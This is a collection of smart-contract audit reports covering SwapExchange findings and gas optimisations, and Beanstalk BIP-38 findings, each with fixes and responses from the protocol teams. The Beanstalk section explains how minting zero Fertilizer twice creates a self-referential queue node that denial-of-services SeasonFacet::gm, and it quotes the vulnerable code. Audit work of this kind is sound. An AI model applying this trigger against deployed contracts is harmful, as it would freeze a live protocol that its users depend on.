178:         SwapUtils.SwapCalculation memory calculation;
179:         calculation.amountA = matchAmount;
180:         calculation.amountB = multiClaimInput.amountB;
181:         calculation.fee = fee;
182:         calculation.feeType = feeType;
183:         calculation.isTokenBNative = multiClaimInput.tokenB == Constants.NATIVE_ADDRESS;
184:         calculation.isComplete = complete;
185:         calculation.nativeSendAmount = SwapUtils._calculateNativeSendAmount(calculation.amountB, calculation.fee, calculation.feeType, calculation.isTokenBNative);
186:         return calculation;
187:     }
```

**Impact:** The function will return an incorrect swap calculation result if the last swap in the chain has a different tokenA than the tokenA of `multiClaimInput` and it can lead to unexpected results.

**Recommended Mitigation:** Add a validation that the tokenA of the last swap in the chain is the same as the tokenA of `multiClaimInput`.

**Protocol:** Fixed in commit [d3c758e](https://github.com/SwapExchangeio/Contracts/commit/d3c758e6c08f6be75bd420ffd8bf4de71a407897).

**Cyfrin:** Verified.

## Informational Findings

### Not proper variable naming

**Severity:** Informational

**Description:** The contract `FeeData` has a internal variable `_feeValue` that is used to calculate the fee.
Across the usage of this variable, it is used as a numerator while calculating the fee percentage.
We recommend renaming this variable to `feeNumerator` to avoid confusion.

```solidity
FeeUtils.sol
16:     function _calculateFees(uint256 amountA, uint256 amountB, uint8 feeType,  uint256 hops, uint256 feeValue, uint256 feeDenominator, uint256 fixedFee)
17:     internal pure returns (uint256) {
18:         if (feeType == Constants.FEE_TYPE_TOKEN_B) {
19:             return MathUtils._mulDiv(amountB, feeValue, feeDenominator) * hops;
20:         }
21:         if (feeType == Constants.FEE_TYPE_TOKEN_A) {
22:             return MathUtils._mulDiv(amountA, feeValue, feeDenominator) * hops;
23:         }
24:         if (feeType == Constants.FEE_TYPE_ETH_FIXED) {
25:             return fixedFee * hops;
26:         }
27:         revert Errors.UnknownFeeType(feeType);
28:     }
```

**Protocol:** Fixed in commit [f6154c9](https://github.com/SwapExchangeio/Contracts/commit/f6154c99edabe7b62d956935a94567c88ee89b3d).

**Cyfrin:** Verified.

### Unnecessary logical operation

**Severity:** Informational

**Description:** In the function `SwapExchange::calculateMultiSwap()` there is a logical operation that is not necessary in the for loop.

```solidity
SwapExchange.sol
161:         for (uint256 i = 0; i < swapIdCount; i++) {
162:             swapId = multiClaimInput.swapIds[i];
163:             SwapUtils.Swap memory swap = swaps[swapId];
164:             if (swap.tokenB != matchToken) revert Errors.NonMatchingToken();
165:             if (swap.amountB < matchAmount) revert Errors.NonMatchingAmount();
166:             if (matchAmount < swap.amountB) {
167:                 if (!swap.isPartial) revert Errors.NotPartialSwap();
168:                 matchAmount = MathUtils._mulDiv(swap.amountA, matchAmount, swap.amountB);
169:                 complete = complete && false;//@audit-issue INFO unnecessary operation, just set complete=false
170:             }
171:             else {
172:                 matchAmount = swap.amountA;
173:             }
174:             matchToken = swap.tokenA;
175:         }
```

**Protocol:** Fixed in commit [a079c11](https://github.com/SwapExchangeio/Contracts/commit/a079c11cc3bc044c61493040dab1f94de4a0f14a).

**Cyfrin:** Verified.

## Gas Optimizations

### Using bools for storage incurs overhead

Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from `false` to `true`, after having been `true` in the past. Check more [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

```solidity
File: helpers/FeeData.sol

18:     mapping(address => bool) public feeTokenMap;

```

```solidity
File: helpers/TransferHelper.sol

16:     bool public rewardsActive;

```

**Protocol:** Fixed in commits [2d48a4b](https://github.com/SwapExchangeio/Contracts/commit/2d48a4b7c371054207866f90b2cd98c98fb34d5a), [84dbd3a](https://github.com/SwapExchangeio/Contracts/commit/84dbd3aafa28ddad88ab1406d0946525f910a261).

**Cyfrin:** Verified.

### Cache array length outside of loop

If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).

```solidity
File: SwapExchange.sol

403:         for (uint i = 0; i < swapIds.length; i++) {
```

```solidity
File: helpers/FeeData.sol

55:         for (uint i = 0; i < feeTokenAddresses.length; i++) {
61:         for (uint i = 0; i < feeTokenKeys.length; i++) {

```

**Protocol:** Fixed in commit [9ba2a93](https://github.com/SwapExchangeio/Contracts/commit/9ba2a93bdad911f541056ced4661bb2fce8db8e0)

**Cyfrin:** Verified.

### For Operations that will not overflow, you could use unchecked

```solidity
File: SwapExchange.sol

209:    ++recordCount;

254:    totalNativeSendAmount += calculation.nativeSendAmount;

407:    total += swap.amountA;

```

```solidity
File: libraries/SwapUtils.sol

93:             uint256 expectedValue = amount + fee;

```

**Protocol:** Fixed in commit [f7a5dac](https://github.com/SwapExchangeio/Contracts/commit/f7a5dac3141f71b06a6d4ad3e44d657bc55ee441).

**Cyfrin:** Verified.

### Use Custom Errors

Instead of using error strings, to reduce deployment and runtime cost, you should use Custom Errors. This would save both deployment and runtime cost. Read more [here](https://blog.soliditylang.org/2021/04/21/custom-errors/).

```solidity
File: helpers/FeeData.sol

32:         require(feeValue < _feeDenominator, "Fee percentage must be less than 1");

```

```solidity
File: helpers/TransferHelper.sol

20:         require(rewardAddress != address(0), "Reward Address is Invalid");

87:         require(rewardAddress != address(0), "Reward Address is Invalid");

98:         require(rewardHandler.logTokenFee(token, fee), "LogTokenFee failed");

103:         require(rewardHandler.logNativeFee(fee), "LogTNativeFee failed");

```

```solidity
File: libraries/TransferUtils.sol

36:         require(erc20 != IERC20(address(0)), "Token Address is not an ERC20");

38:         require(erc20.transfer(to, amount), "ERC20 Transfer failed");

40:         require(balance >= (initialBalance + amount), "ERC20 Balance check failed");

45:         require(erc20 != IERC20(address(0)), "Token Address is not an ERC20");

47:         require(erc20.transferFrom(from, to, amount), "ERC20 Transfer failed");

49:         require(balance >= (initialBalance + amount), "ERC20 Balance check failed");

54:         require(flag == true, "ETH transfer failed");

```

**Protocol:** Fixed in commit [ffe50aa](https://github.com/SwapExchangeio/Contracts/commit/ffe50aa913d373724ec12bc704387dfaefaab7a5) and [9ba796f](https://github.com/SwapExchangeio/Contracts/commit/9ba796f6ff0161376b254d80db55d3bc33414a30)

**Cyfrin:** Verified.

### Don't initialize variables with default value

```solidity
File: SwapExchange.sol

130:         for (uint256 i = 0; i < length; i++) {

161:         for (uint256 i = 0; i < swapIdCount; i++) {

247:         for (uint256 i = 0; i < length; i++) {

346:         for (uint256 i = 0; i < swapIdCount; i++) {

403:         for (uint i = 0; i < swapIds.length; i++) {

```

```solidity
File: helpers/FeeData.sol

55:         for (uint i = 0; i < feeTokenAddresses.length; i++) {

61:         for (uint i = 0; i < feeTokenKeys.length; i++) {

```

```solidity
File: libraries/Constants.sol

6:     uint8 public constant FEE_TYPE_ETH_FIXED = 0;

```

**Protocol:** Fixed for for-loops in commit 83ffebcc099da256ec53644afc733eab2586c636.

**Cyfrin:** Verified.

### `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)

```solidity
File: SwapExchange.sol

130:         for (uint256 i = 0; i < length; i++) {

161:         for (uint256 i = 0; i < swapIdCount; i++) {

247:         for (uint256 i = 0; i < length; i++) {

346:         for (uint256 i = 0; i < swapIdCount; i++) {

403:         for (uint i = 0; i < swapIds.length; i++) {

```

```solidity
File: helpers/FeeData.sol

55:         for (uint i = 0; i < feeTokenAddresses.length; i++) {

61:         for (uint i = 0; i < feeTokenKeys.length; i++) {

```

**Protocol:** Fixed in commit [5662786](https://github.com/SwapExchangeio/Contracts/commit/5662786421251a32444427d4ede74100a4c772f0).

**Cyfrin:** Verified.

### Use != 0 instead of > 0 for unsigned integer comparison

```solidity
File: helpers/FeeData.sol

64:         while (feeTokenKeys.length > 0) {

```

```solidity
File: libraries/SwapUtils.sol

96:         else if (sentAmount > 0) {

```

**Protocol:** Fixed in commit [4679de1](https://github.com/SwapExchangeio/Contracts/commit/4679de1c3f8adfc4122698fc82a529322ba4b5ed).

**Cyfrin:** Verified.

------ FILE END car/reports_md/2023-09-19-cyfrin-swapexchange.md ------


------ FILE START car/reports_md/2023-10-13-cyfrin-beanstalk-bip-38.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Carlos Amarante](https://twitter.com/carlitox477)

**Assisting Auditors**



---

# Findings
## High Risk

### Migration of unripe LP from BEAN:3CRV to BEAN:ETH does not account for recapitalization accounting error
**Description:** The global [`AppStorage::recapitalized`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/AppStorage.sol#L485) state refers to the dollar amount recapitalized when Fertilizer was bought with USDC and paired with BEAN for BEAN:3CRV LP. When removing this underlying liquidity and swapping 3CRV for WETH during the migration of unripe LP, it is very likely that the BCM will experience some slippage. This is more likely to be the case if the swap is made on the open market rather than an OTC deal, but either way it is likely that the dollar value of the resulting WETH, and hence BEAN:ETH LP, will be less than it was as BEAN:3CRV before the migration. Currently, [`UnripeFacet::addMigratedUnderlying`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L257) updates the BEAN:ETH LP token balance underlying the unripe LP, completing the migration, but does not account for any changes in the dollar value as outlined above. Based on the current implementation, it is very likely that the BCM will complete migration by transferring less in dollar value while the recapitalization status remains the same, causing inconsistency in [`LibUnripe::percentLPRecapped`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibUnripe.sol#L30-L36) and `LibUnripe::add/removeUnderlying` which are used in the conversion of urBEAN  urBEANETH in `LibUnripeConvert`. Therefore, the global recapitalized state should be updated to reflect the true dollar value of recapitalization on completion of the migration.

**Impact:** Once sufficiently funded by purchasers of Fertilizer, it is possible that recapitalization could be considered completed with insufficient underlying BEAN:ETH LP. This amounts to a loss of user funds since the true recapitalized amount will be less than that specified by [`C::dollarPerUnripeLP`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/C.sol#L190-L192) which is used to calculate the total dollar liability in [`LibFertilizer::remainingRecapitalization`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L159-L163).

**Recommended Mitigation:** Reassign `s.recapitalized` to the oracle USD amount of the new BEAN:ETH LP at the time of migration completion.

```diff
    function addMigratedUnderlying(address unripeToken, uint256 amount) external payable nonReentrant {
        LibDiamond.enforceIsContractOwner();
        IERC20(s.u[unripeToken].underlyingToken).safeTransferFrom(
            msg.sender,
            address(this),
            amount
        );
        LibUnripe.incrementUnderlying(unripeToken, amount);

+       uint256 recapitalized = amount.mul(LibEthUsdOracle.getEthUsdPrice()).div(1e18);
+       require(recapitalized != 0, "UnripeFacet: cannot calculate recapitalized");
+       s.recapitalized = s.recapitalized.add(recapitalized);
    }
```

**Beanstalk Farms:** This is intentional  the cost of slippage goes to the Unripe LP token holders. This should be clearly stated in the BIP draft.

**Cyfrin:** Acknowledged.


## Medium Risk

### Insufficient validation of new Fertilizer IDs allow for a denial-of-service (DoS) attack on `SeasonFacet::gm` when above peg, once the last element in the FIFO is paid

**Description:** A Fertilizer NFT can be interpreted as a bond without an expiration date which is to be repaid in Beans and includes interest (Humidity). This bond is placed in a FIFO list and intended to recapitalize the $77 million in liquidity stolen during the [April 2022 exploit](https://docs.bean.money/almanac/farm/barn). One Fertilizer can be purchased for 1 USD worth of WETH:prior to BIP-38, this purchase was made using USDC.

Each fertilizer is identified by an Id that depends on `s.bpf`, indicating the cumulative amount of Beans paid per Fertilizer. This value increases each time [`Sun::rewardToFertilizer`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L153) is called, invoked by `SeasonFacet::gm` if the Bean price is above peg. Therefore, Fertilizer IDs depend on `s.bpf` [at the moment of minting](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L45-L51), in addition to the [amount of Beans to be paid](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L64-L66).

The FIFO list has following components:
* `s.fFirst`: Fertilizer Id corresponding to the next Fertilizer to be paid.
* `s.fLast`: The highest active Fertilizer Id which is the last Fertilizer to be paid.
* `s.nextFid`: Mapping from Fertilizer Id to Fertilizer id, indicating the next element of a [linked list](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/AppStorage.sol#L477-L477). If an Id points to 0, then there is no next element.

Methods related to this FIFO list include:
`LibFertilizer::push`: Add an element to the FIFO list.
`LibFertilizer::setNext`: Given a fertilizer id, add a pointer to next element in the list
`LibFertilizer::getNext`: Get next element in the list.

The intended behaviour of this list is to add a new element to its end whenever a new fertilizer is minted with a new Id. Intermediate addition to the list was formerly allowed only by the Beanstalk DAO, but this functionality has since been deprecated in the current upgrade with the removal of `FertilizerFacet::addFertilizerOwner`.

*Consequences of replacing BEAN:3CRV MetaPool with the BEAN:ETH Well:*
Before this upgrade, addition of 0 Fertilizer through `LibFertilizer::addFertilizer` was impossible due to the dependency on Curve in `LibFertilizer::addUnderlying`:

```solidity
// Previous code

    function addUnderlying(uint256 amount, uint256 minAmountOut) internal {
        //...
        C.bean().mint(
            address(this),
            newDepositedBeans.add(newDepositedLPBeans)
        );

        // Add Liquidity
        uint256 newLP = C.curveZap().add_liquidity(
            C.CURVE_BEAN_METAPOOL, // where to add liquidity
            [
                newDepositedLPBeans, // BEANS to add
                0,
                amount, // USDC to add
                0
            ], // how much of each token to add
            minAmountOut // min lp ampount to receive
        ); // @audit-ok Does not admit depositing 0 --> https://etherscan.io/address/0x5F890841f657d90E081bAbdB532A05996Af79Fe6#code#L487

        // Increment underlying balances of Unripe Tokens
        LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);
        LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);

        s.recapitalized = s.recapitalized.add(amount);
    }
```

However, with the change of dependency involved in the Wells integration, this restriction no longer holds:
```solidity
    function addUnderlying(uint256 usdAmount, uint256 minAmountOut) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // Calculate how many new Deposited Beans will be minted
        uint256 percentToFill = usdAmount.mul(C.precision()).div(
            remainingRecapitalization()
        );
        uint256 newDepositedBeans;
        if (C.unripeBean().totalSupply() > s.u[C.UNRIPE_BEAN].balanceOfUnderlying) {
            newDepositedBeans = (C.unripeBean().totalSupply()).sub(
                s.u[C.UNRIPE_BEAN].balanceOfUnderlying
            );
            newDepositedBeans = newDepositedBeans.mul(percentToFill).div(
                C.precision()
            );
        }

        // Calculate how many Beans to add as LP
        uint256 newDepositedLPBeans = usdAmount.mul(C.exploitAddLPRatio()).div(
            DECIMALS
        );

        // Mint the Deposited Beans to Beanstalk.
        C.bean().mint(
            address(this),
            newDepositedBeans
        );

        // Mint the LP Beans to the Well to sync.
        C.bean().mint(
            address(C.BEAN_ETH_WELL),
            newDepositedLPBeans
        );

        // @audit If nothing was previously deposited this function returns 0, IT DOES NOT REVERT
        uint256 newLP = IWell(C.BEAN_ETH_WELL).sync(
            address(this),
            minAmountOut
        );

        // Increment underlying balances of Unripe Tokens
        LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);
        LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);

        s.recapitalized = s.recapitalized.add(usdAmount);
    }
```

Given that the new integration does not revert when attempting to add 0 Fertilizer, it is now possible to add a self-referential node to the end FIFO list, but only if this is the first Fertilizer NFT to be minted for the current season by twice calling `FertilizerFacet.mintFertilizer(0, 0, 0, mode)`. The [validation](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L57-L58) performed to prevent duplicate ids is erroneously bypassed given the Fertilizer amount for the given Id remains zero.

```solidity
    function push(uint128 id) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        if (s.fFirst == 0) {
            // Queue is empty
            s.season.fertilizing = true;
            s.fLast = id;
            s.fFirst = id;
        } else if (id <= s.fFirst) {
            // Add to front of queue
            setNext(id, s.fFirst);
            s.fFirst = id;
        } else if (id >= s.fLast) { // @audit this block is entered twice
            // Add to back of queue
            setNext(s.fLast, id); // @audit the second time, a reference is added to the same id
            s.fLast = id;
        } else {
            // Add to middle of queue
            uint128 prev = s.fFirst;
            uint128 next = getNext(prev);
            // Search for proper place in line
            while (id > next) {
                prev = next;
                next = getNext(next);
            }
            setNext(prev, id);
            setNext(id, next);
        }
    }
```
Despite first perhaps seeming harmless, this element can never be remove unless otherwise overridden:

```solidity
    function pop() internal returns (bool) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint128 first = s.fFirst;
        s.activeFertilizer = s.activeFertilizer.sub(getAmount(first)); // @audit getAmount(first) would return 0
        uint128 next = getNext(first);
        if (next == 0) { // @audit next != 0, therefore this conditional block is skipped
            // If all Unfertilized Beans have been fertilized, delete line.
            require(s.activeFertilizer == 0, "Still active fertilizer");
            s.fFirst = 0;
            s.fLast = 0;
            s.season.fertilizing = false;
            return false;
        }
        s.fFirst = getNext(first); // @audit this gets s.first again
        return true; // @audit always returns true for a self-referential node
    }
```

`LibFertilizer::pop` is used in [`Sun::rewardToFertilizer`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L132-L150) which is called through [`Sun::rewardBeans`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L97) when fertilizing. This function is called through [`Sun::stepSun`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L73) if the current Bean price is above peg. By preventing the last element from being popped from the list, assuming this element is reached, an infinite loop occurs given that the `while` loop continues to execute, resulting in denial-of-service on [`SeasonFacet::gm`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L59) when above peg.

The most remarkable detail of this issue is that this state can be forced when above peg and having already been fully recapitalized. Given that it is not possible to mint additional Fertilizer with the associated Beans, this means that a DoS attack can be performed on `SeasonFacet::gm` once recapitalization is reached if the BEAN price is above peg.

**Impact:** It is possible to perform a denial-of-service (DoS) attack on `SeasonFacet::gm` if the Bean price is above the peg, either once fully recapitalized or when reaching the last element of the Fertilizer FIFO list.

**Proof of Concept:** [This coded PoC](https://gist.github.com/carlitox477/1b0dde178288982f4e25d40b9e43e626) can be run by:
1. Creating file `Beantalk/protocol/test/POCs/mint0Fertilizer.test.js`
2. Navigating to `Beantalk/protocol`
3. Running `yarn test --grep "DOS last fertilizer payment through minting 0 fertilizers"`

**Recommended Mitigation:** Despite being a complex issue to explain, the solution is as simple as replacing `>` with `>=` in `LibFertilizer::addFertilizer` as below:

```diff
    function addFertilizer(
        uint128 season,
        uint256 fertilizerAmount,
        uint256 minLP
    ) internal returns (uint128 id) {
        AppStorage storage s = LibAppStorage.diamondStorage();

        uint128 fertilizerAmount128 = fertilizerAmount.toUint128();

        // Calculate Beans Per Fertilizer and add to total owed
        uint128 bpf = getBpf(season);
        s.unfertilizedIndex = s.unfertilizedIndex.add(
            fertilizerAmount.mul(bpf)
        );
        // Get id
        id = s.bpf.add(bpf);
        // Update Total and Season supply
        s.fertilizer[id] = s.fertilizer[id].add(fertilizerAmount128);
        s.activeFertilizer = s.activeFertilizer.add(fertilizerAmount);
        // Add underlying to Unripe Beans and Unripe LP
        addUnderlying(fertilizerAmount.mul(DECIMALS), minLP);
        // If not first time adding Fertilizer with this id, return
-       if (s.fertilizer[id] > fertilizerAmount128) return id;
+       if (s.fertilizer[id] >= fertilizerAmount128) return id; // prevent infinite loop in `Sun::rewardToFertilizer` when attempting to add 0 Fertilizer, which could DoS `SeasonFacet::gm` when recapitalization is fulfilled
        // If first time, log end Beans Per Fertilizer and add to Season queue.
        push(id);
        emit SetFertilizer(id, bpf);
    }
```

**Beanstalk Farms:** Added a > 0 check to the `mintFertilizer` function in commit hash [4489cb8](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/4489cb869b1a1f8a2535a04364460c79ffb75b11).

**Cyfrin:** Acknowledged. The Beanstalk Farms team has opted to add validation in `FertilizerFacet::mintFertilizer`. This alternative saves more gas compared to the one suggested; however, this issue should be considered in the future if `LibFertilizer::addFertilizer` is used anywhere else. This is the case in `FertilizerFacet::addFertilizerOwner` but assumedly will not be an issue as the owner would not send this type of transaction.


\clearpage
## Low Risk

### Incorrect handling of metadata traits in the attributes of `MetadataFacet::uri`

**Description:** For fully on-chain metadata, external clients expect the URI of a token to contain a base64 encoded JSON object that contains the metadata and base64 encoded SVG image. As raised previously, if these attributes are intented to be utilized as metadata traits then failure to correctly handle the packed encoding of the [attributes variable](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L38-L47) as an array of JSON objects in `MetadataFacet::uri` results in non-standard JSON metadata when subsequently [returned](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L48-L55), meaning it cannot be fully utilized by external clients.

**Impact:** External clients such as OpenSea are currently unable to display Beanstalk token metadata traits due to non-standard JSON formatting.

**Recommended Mitigation:** Refactor the inline metadata attributes as an array of metadata trait objects, ensuring the resulting encoded bytes are that of valid JSON.

**Beanstalk Farms:** Fixed in commit [47fef03](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/47fef03a37527c839acd4696db08fbf0bbcd5a71).

**Cyfrin:** Acknowledged.


\clearpage
## Informational

### Resetting of `withdrawSeasons` state was not executed on-chain as part of the BIP-36 upgrade
The [addition](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L42-L43) of `s.season.withdrawSeasons = 0` to `InitBipNewSilo::init` does not appear to have been present in the [version](https://etherscan.io/address/0xf6c77e64473b913101f0ec1bfb75a386aba15b9e#code) executed as part of the BIP-36 upgrade. Therefore, to have the state of Beanstalk accurately reflect this change, another upgrade should be performed to have this logic executed on-chain.

**Beanstalk Farms:** Fixed in commit [cca6250](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/cca625052179764c930be707a68a43952ec54ddf).

**Cyfrin:** Acknowledged.

### Changes to initialization contracts are not recommended after they are executed on-chain
It is understood that certain modifications to BIP initialization contracts have been made retroactively with the intention that, if run again, any new deployments of the Beanstalk protocol by replaying this history will reflect the current state of Beanstalk. One particular [modification](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/init/InitDiamond.sol#L62) to `InitDiamond::init`, setting the `stemStartSeason` to zero, while seemingly benign as migration logic in `LibSilo` appears to be bypassed, would result in underdlow within `LibLegacyTokenSilo::_calcGrownStalkForDeposit` when calculating the [Season diff](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L469). This issue will be present until `InitBipNewSilo::init` excutes, setting the `stemStartSeason` state to the [Season in which it is executed](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L76-L77). It is therefore recommended that initialization scripts are ossified after being executed on-chain to maintain an accurate history of the protocol: its mechanism developments, bugs and related upgrades/mitigations.

**Beanstalk Farms:** The purpose of such changes is to future proof future deployments of Beanstalk. If someone were to deploy a fresh Beanstalk, it is important that the protocol continues to function as expected with all upgrades already implemented.

The expectation is that a new Beanstalk would be initialized only with `InitDiamond` and that Beanstalk would automatically be on the newest version. The other `Init` contracts are intended strictly to migrate from a previous version to the next.

The `LibLegacyTokenSilo` is only used to provide legacy support and migration functionality for Silo V2. This includes, the `MigrationFacet`, `LegacyClaimWithdrawalFacet` and `seasonToStem(address token, uint32 season)` in `SiloExit`. The expectation is that a new Beanstalk would be deployed immediately with the Silo V3 upgrade and thus have no reason to be backwards compatable with Silo V2 or support migration from V2 to V3 in any capacity.

**Cyfrin:** Acknowledged.

### Lack of slippage protection when removing liquidity from BEAN:3CRV MetaPool and adding liquidity to BEAN:ETH Well could result in loss of funds due to sandwich attack
Currently, the second and third steps of the *Migration Process*, as provided in BIP-38 specification, are not included in the scope of this BIP. The primary risk associated with these steps is the swap of BEAN:3CRV LP Tokens for BEAN:ETH Well LP Tokens, given the size of the swap to be performed. Sandwiching of the transaction that executes this swap could result in loss of funds. Therefore, the use of reasonable slippage parameters is essential to prevent this. It is understood that the current use of zero [slippage parameters](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/scripts/beanEthMigration.js#L26) within the `beanEthMigration.js` migration script when removing liquidity from the MetaPool and [adding liquidity](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/scripts/beanEthMigration.js#L39) to the Well is only intended for testing purposes. The swap path from 3CRV -> WETH will either be executed manually via the BCM on a DEX aggregator with MEV protection or via an OTC swap, and the BCM will ensure the proper use of slippage parameters when removing/adding liquidity. It is essential that this is the case.

**Beanstalk Farms:** This script is only expected to be used to mock the migration to aid in testing. The expectation is that it will never be used to execute code on mainnet and thus no slippage parameter is added.

**Cyfrin:** Acknowledged.

### `LibEthUsdOracle::getEthUsdPrice` design changes should be documented
Before BIP-38, the `LibEthUsdOracle::getEthUsdPrice` function had the following behavior:
1. If the difference between the Chainlink ETH/USD oracle and the Uniswap ETH/USDC TWAP oracle (considering a 15-minute window) prices was below `0.5%`, then it would return the average of both values. Now, this difference should be below `0.3%`.
2. If the difference between the Chainlink ETH/USD oracle and the Uniswap ETH/USDC TWAP oracle (considering a 15-minute window) was greater than the difference between the Chainlink ETH/USD oracle and the Uniswap ETH/USDT TWAP oracle (considering a 15-minute window), then:
    * If the difference between the Chainlink ETH/USD oracle and the Uniswap ETH/USDT TWAP oracle (considering a 15 minute-window) prices was below `2%`, it would return the average of these two prices. Now, this difference should be less than `1%`.
    * Otherwise, it would return 0, indicating that the oracle is broken or stale. Now, it returns the Chainlink ETH/USD oracle price, assuming it is correct.
3. Otherwise:
    * If the difference between the Chainlink ETH/USD oracle and the Uniswap ETH/USDC TWAP oracle (considering a 15-minute window) prices was below `2%`, it would return the average of these two prices. Now, this difference should be less than `1%`.
    * Otherwise, it would return 0, indicating that the oracle is broken or stale. Now, it returns the Chainlink ETH/USD oracle price, assuming it is correct.

In essence, this function now assumes that the Chainlink ETH/USD price is correct as long as it is not stale or broken (if it returns 0). In cases where the difference between this price and the Uniswap ETH/USDC TWAP oracle price or Uniswap ETH/USDT TWAP oracle price is outside certain thresholds, it considers and averages with one of these values. Previously, if this difference was not within certain bounds, the oracle was considered to be broken.

**Beanstalk Farms:** This change was actually made before BIP-37 was deployed, but this modification was omitted from the previous Cyfrin audit. Thus, no functionality in `getEthUsdPrice` changed as a part of BIP-38.

The comments in `LibEthUsdOracle` were not correct and have been updated in commit [968f783](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/968f783d3d062b93f9f692accc9e7ad60d4f1ab6).

**Cyfrin:** Acknowledged. Comments now match the code's intention.

### Logic in `LibFertilizer::push` related to (deprecated) intermediate addition of Fertilizer to FIFO list should be removed
Intermediate addition to the FIFO list was formerly allowed only by the Beanstalk DAO, but this functionality has since been deprecated in the current upgrade with the removal of `FertilizerFacet::addFertilizerOwner`. Consequently, the [corresponding logic](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L139-L147) in `LibFertilizer::push` should be removed as this now represents unreachable code.

**Beanstalk Farms:** the `push(...)` function is still used internally [here](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/LibFertilizer.sol#L60).

The highlighted segment is not used reachable anymore, but in the case where the humidity is changed for some reason, it could again be reached. For this reason, the decision was made to leave it in.

**Cyfrin:** Acknowledged.

### Consider moving the `MetadataFacet::uri` disclaimer from metadata attributes to the description
The [disclaimer](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L46) within `MetadataFacet::uri` currently resides at the end of the JSON attributes; however, this may be better placed within the metadata description instead.

**Beanstalk Farms:** The disclaimer placement was largely inspired by [Uniswap V3s NFT](https://opensea.io/assets/ethereum/0xc36442b4a4522e871399cd717abdd847ab11fe88/528320) and thus, feel that the attribute section is an adequate place to keep it.

**Cyfrin:** Acknowledged.

### Incorrect comment in `MetadataImage::sciNotation` should be corrected
